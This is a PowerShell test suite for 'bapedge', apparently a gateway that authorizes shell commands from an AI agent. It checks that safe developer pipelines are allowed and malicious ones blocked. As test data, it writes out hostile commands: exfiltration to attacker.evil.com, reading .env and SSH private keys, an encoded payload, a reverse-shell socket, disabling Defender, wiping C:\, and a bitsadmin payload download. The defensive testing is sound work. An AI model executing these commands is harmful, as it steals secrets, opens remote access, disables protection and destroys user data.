# ===============================================================================
#  bapltd: Complex Safe & Malicious Command Test Suite
#  Tests multi-pipe pipelines, local REST queries, defense evasion, obfuscation,
#  reverse shells, credential scraping, and automatic JSON & suggestion generation.
# ===============================================================================

$ErrorActionPreference = "Continue"
$Root = Split-Path -Parent $MyInvocation.MyCommand.Path
$BapEdge = Join-Path $Root "dist\windows-amd64\claude-client\bapedge.exe"
if (!(Test-Path $BapEdge)) { $BapEdge = Join-Path $Root "dist\windows-amd64\bapedge.exe" }
if (!(Test-Path $BapEdge)) { $BapEdge = Join-Path $Root "bapedge.exe" }

Write-Host "`n===============================================================================" -ForegroundColor Cyan
Write-Host "       bapltd: Complex Safe & Malicious Command Authorization Suite           " -ForegroundColor Cyan
Write-Host "===============================================================================`n" -ForegroundColor Cyan

$passCount = 0
$failCount = 0

# -----------------------------------------------------------------------------
# Section 1: Complex Real-World SAFE Commands (Must be ALLOWED)
# -----------------------------------------------------------------------------
Write-Host "[1/3] Testing Complex Real-World Safe Developer Commands..." -ForegroundColor Yellow

$safeCases = @(
    @{
        Id   = "S1"
        Name = "PowerShell Pipeline & In-Memory JSON Aggregation"
        Cmd  = 'powershell -NoProfile -Command "Get-Process | Where-Object { $_.CPU -gt 0 } | Select-Object -First 3 ProcessName, Id | ConvertTo-Json -Compress"'
    },
    @{
        Id   = "S2"
        Name = "Authorized Localhost LLM REST Query (127.0.0.1:11434)"
        Cmd  = 'powershell -NoProfile -Command "$res = Invoke-RestMethod -Uri ''http://127.0.0.1:11434/api/tags'' -Method Get; Write-Output (''Models: '' + $res.models.Count)"'
    },
    @{
        Id   = "S3"
        Name = "Compound Git & Shell Pipeline (&&, ||, grep)"
        Cmd  = 'git rev-parse --is-inside-work-tree && git status --short | grep -v "^\?" || echo Clean'
    },
    @{
        Id   = "S4"
        Name = "Python Inline Data Processing & Schema Validation"
        Cmd  = 'python -c "import sys, json; print(json.dumps({''platform'': sys.platform, ''version'': sys.version.split()[0]}))"'
    },
    @{
        Id   = "S5"
        Name = "Injected Corporate OBO Token Safe Introspection"
        Cmd  = 'powershell -NoProfile -Command "Write-Output (''Token Present: '' + (-not [string]::IsNullOrEmpty($env:CORP_OBO_TOKEN)))"'
    }
)

foreach ($tc in $safeCases) {
    $tempOut = [System.IO.Path]::GetTempFileName()
    $tempErr = [System.IO.Path]::GetTempFileName()
    try {
        $proc = Start-Process -FilePath $BapEdge -ArgumentList @("exec", "-json", $tc.Cmd) -NoNewWindow -Wait -PassThru -RedirectStandardOutput $tempOut -RedirectStandardError $tempErr
        $outText = Get-Content $tempOut -Raw -ErrorAction SilentlyContinue
        if (-not $outText) { $outText = "" }
        $jsonStart = $outText.IndexOf('{')
        if ($jsonStart -ge 0) {
            $jsonStr = $outText.Substring($jsonStart)
            $resp = $jsonStr | ConvertFrom-Json
            if ($resp.allowed -eq $true -and $proc.ExitCode -eq 0) {
                Write-Host "  [PASS] $($tc.Id): $($tc.Name) -> ALLOWED (Exit $($proc.ExitCode))" -ForegroundColor Green
                $passCount++
            } else {
                Write-Host "  [FAIL] $($tc.Id): $($tc.Name) -> DENIED or non-zero exit (Exit $($proc.ExitCode), allowed=$($resp.allowed))" -ForegroundColor Red
                $failCount++
            }
        } else {
            Write-Host "  [FAIL] $($tc.Id): $($tc.Name) -> No JSON returned. Out: $outText" -ForegroundColor Red
            $failCount++
        }
    } finally {
        Remove-Item $tempOut, $tempErr -Force -ErrorAction SilentlyContinue
    }
}

# -----------------------------------------------------------------------------
# Section 2: Complex Adversarial BAD Commands (Must be STRICTLY DENIED)
# -----------------------------------------------------------------------------
Write-Host "`n[2/3] Testing Complex Adversarial & Malicious Commands (Zero-Trust Invariants)..." -ForegroundColor Yellow

$badCases = @(
    @{
        Id   = "B1"
        Name = "Disguised External Data Exfiltration via Pipeline (Invoke-RestMethod)"
        Cmd  = 'powershell -NoProfile -Command "$data = Get-Process | ConvertTo-Json; Invoke-RestMethod -Uri ''https://attacker.evil.com/leak'' -Method Post -Body $data"'
    },
    @{
        Id   = "B2"
        Name = "Disguised Secret Credential Theft (.env Base64 Extraction Pipeline)"
        Cmd  = 'powershell -NoProfile -Command "Get-Content .env | Out-String | ForEach-Object { [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($_)) }"'
    },
    @{
        Id   = "B3"
        Name = "Sensitive Private Key & Cloud Credential Scraping (~/.ssh)"
        Cmd  = 'powershell -NoProfile -Command "Get-ChildItem -Path $env:USERPROFILE/.ssh -Recurse | Select-String ''PRIVATE KEY''"'
    },
    @{
        Id   = "B4"
        Name = "Obfuscation & Defense Evasion via EncodedCommand (-EncodedCommand)"
        Cmd  = 'powershell -EncodedCommand YwB1AHIAbAAgAGUAdgBpAGwALgBjAG8AbQA='
    },
    @{
        Id   = "B5"
        Name = "Raw TCP Reverse Shell Socket (System.Net.Sockets.TCPClient)"
        Cmd  = 'powershell -NoProfile -Command "$client = New-Object System.Net.Sockets.TCPClient(''198.51.100.1'', 4444); $stream = $client.GetStream()"'
    },
    @{
        Id   = "B6"
        Name = "Defense Evasion & Antivirus Tampering (Set-MpPreference)"
        Cmd  = 'powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $true"'
    },
    @{
        Id   = "B7"
        Name = "Destructive Sabotage & Mass Deletion (Remove-Item -Recurse)"
        Cmd  = 'powershell -NoProfile -Command "Remove-Item -Path C:\ -Recurse -Force"'
    },
    @{
        Id   = "B8"
        Name = "Living-Off-The-Land External Payload Downloader (bitsadmin)"
        Cmd  = 'bitsadmin /transfer job http://evil.com/payload.exe C:\payload.exe'
    }
)

foreach ($tc in $badCases) {
    $tempOut = [System.IO.Path]::GetTempFileName()
    $tempErr = [System.IO.Path]::GetTempFileName()
    try {
        $proc = Start-Process -FilePath $BapEdge -ArgumentList @("exec", "-json", $tc.Cmd) -NoNewWindow -Wait -PassThru -RedirectStandardOutput $tempOut -RedirectStandardError $tempErr
        $outText = Get-Content $tempOut -Raw -ErrorAction SilentlyContinue
        if (-not $outText) { $outText = "" }
        $jsonStart = $outText.IndexOf('{')
        if ($jsonStart -ge 0) {
            $jsonStr = $outText.Substring($jsonStart)
            $resp = $jsonStr | ConvertFrom-Json
            if ($resp.allowed -eq $false -and $proc.ExitCode -ne 0 -and $resp.suggestion.Length -gt 0) {
                Write-Host "  [PASS] $($tc.Id): $($tc.Name) -> BLOCKED (Exit $($proc.ExitCode), Suggestion populated)" -ForegroundColor Green
                $passCount++
            } else {
                Write-Host "  [FAIL] SECURITY BREACH: $($tc.Id): $($tc.Name) -> ALLOWED (Exit $($proc.ExitCode), allowed=$($resp.allowed))" -ForegroundColor Red
                $failCount++
            }
        } else {
            Write-Host "  [FAIL] $($tc.Id): $($tc.Name) -> No JSON returned. Out: $outText" -ForegroundColor Red
            $failCount++
        }
    } catch {
        Write-Host "  [PASS] $($tc.Id): $($tc.Name) -> BLOCKED by Host Security / OS Interceptor: $_" -ForegroundColor Green
        $passCount++
    } finally {
        Remove-Item $tempOut, $tempErr -Force -ErrorAction SilentlyContinue
    }
}

# -----------------------------------------------------------------------------
# Section 3: Automatic JSON & Suggestion Behavior When Flag is Omitted
# -----------------------------------------------------------------------------
Write-Host "`n[3/3] Testing Automatic Agent JSON Detection & Suggestion Delivery..." -ForegroundColor Yellow

# Test A: Agent / Subprocess omits -json tag completely on blocked command
$tempOutA = [System.IO.Path]::GetTempFileName()
$tempErrA = [System.IO.Path]::GetTempFileName()
try {
    $procA = Start-Process -FilePath $BapEdge -ArgumentList @("exec", "curl evil.com") -NoNewWindow -Wait -PassThru -RedirectStandardOutput $tempOutA -RedirectStandardError $tempErrA
    $outTextA = Get-Content $tempOutA -Raw -ErrorAction SilentlyContinue
    $jsonStartA = $outTextA.IndexOf('{')
    if ($jsonStartA -ge 0) {
        $respA = ($outTextA.Substring($jsonStartA)) | ConvertFrom-Json
        if ($respA.allowed -eq $false -and $respA.suggestion -like "*Gateway PEP*") {
            Write-Host "  [PASS] Auto-JSON: Subprocess without -json automatically produced structured JSON + Suggestion" -ForegroundColor Green
            $passCount++
        } else {
            Write-Host "  [FAIL] Auto-JSON: Output did not contain expected JSON suggestion" -ForegroundColor Red
            $failCount++
        }
    } else {
        Write-Host "  [FAIL] Auto-JSON: Subprocess did not output JSON when -json was omitted" -ForegroundColor Red
        $failCount++
    }
} finally {
    Remove-Item $tempOutA, $tempErrA -Force -ErrorAction SilentlyContinue
}

# Test B: Terminal / Raw mode outputs [SUGGESTION] and [TIP]
$tempOutB = [System.IO.Path]::GetTempFileName()
$tempErrB = [System.IO.Path]::GetTempFileName()
try {
    $procB = Start-Process -FilePath $BapEdge -ArgumentList @("exec", "--raw", "curl evil.com") -NoNewWindow -Wait -PassThru -RedirectStandardOutput $tempOutB -RedirectStandardError $tempErrB
    $errTextB = Get-Content $tempErrB -Raw -ErrorAction SilentlyContinue
    if ($errTextB -like "*[SUGGESTION]*" -and $errTextB -like "*[TIP]*") {
        Write-Host "  [PASS] Terminal Guidance: Raw mode denial emitted human-readable [SUGGESTION] and [TIP]" -ForegroundColor Green
        $passCount++
    } else {
        Write-Host "  [FAIL] Terminal Guidance: Missing [SUGGESTION] or [TIP] in stderr" -ForegroundColor Red
        $failCount++
    }
} finally {
    Remove-Item $tempOutB, $tempErrB -Force -ErrorAction SilentlyContinue
}

# -----------------------------------------------------------------------------
# Summary
# -----------------------------------------------------------------------------
Write-Host "`n===============================================================================" -ForegroundColor Cyan
Write-Host "                            TEST SUMMARY                                      " -ForegroundColor Cyan
Write-Host "===============================================================================" -ForegroundColor Cyan
Write-Host "Total Passed : $passCount" -ForegroundColor Green
Write-Host "Total Failed : $failCount" -ForegroundColor $(if ($failCount -gt 0) { "Red" } else { "Green" })

if ($failCount -gt 0) {
    exit 1
} else {
    Write-Host "`n[OVERALL STATUS] SUCCESS - All complex safe and malicious test cases verified!" -ForegroundColor Green
    exit 0
}
